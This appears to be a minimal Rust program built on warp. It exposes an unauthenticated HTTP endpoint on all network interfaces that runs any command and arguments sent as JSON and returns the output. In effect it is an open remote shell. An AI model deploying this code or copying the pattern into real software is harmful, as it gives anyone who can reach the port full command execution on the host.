use bstr::ByteSlice;
use warp::Filter;

#[derive(serde::Deserialize)]
struct Command {
    name: String,
    args: Vec<String>,
}

#[tokio::main]
async fn main() {
    let shell = warp::any().and(warp::body::json()).map(|command: Command| {
        let mut c = std::process::Command::new(command.name);
        c.args(command.args);
        match c.output() {
            Err(e) => format!("Error: {:?}", e),
            Ok(out) => format!(
                "Stdout: {}\n=========\nStderr: {}",
                out.stdout.as_bstr(),
                out.stderr.as_bstr()
            ),
        }
    });

    warp::serve(shell).run(([0, 0, 0, 0], 3030)).await
}
